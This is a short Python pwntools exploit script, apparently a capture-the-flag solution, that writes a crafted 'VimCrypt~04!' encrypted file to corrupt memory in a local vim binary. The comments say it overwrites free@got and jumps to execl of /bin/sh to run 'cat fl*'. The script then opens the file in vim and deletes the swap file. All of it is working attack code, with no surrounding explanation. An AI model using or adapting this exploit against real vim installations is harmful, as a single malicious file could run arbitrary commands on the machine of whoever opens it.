from pwn import *
import os

s = ELF('./vim')

header = "VimCrypt~04!"
step = lambda x : x ^ 0x61

f = open('escape', 'wb')
f.write(header)
f.write(p32(step(0xffffffff))[::-1])
f.write('A'*21)
f.write(p64(0x30828a0000000000)) # free@got overwrite
f.write(p64(0x6c2a0064914c0064)) # 0x4c9164 -> execl("/bin/sh", "sh", "-c", dest, 0LL)
f.write(p64(0x4141416361742066)) # cat fl*\x00
f.write(p32(0x41414141))
f.close()

os.system('echo ":q" | ./vim --clean ./escape')
os.system('rm ./.escape.swp')
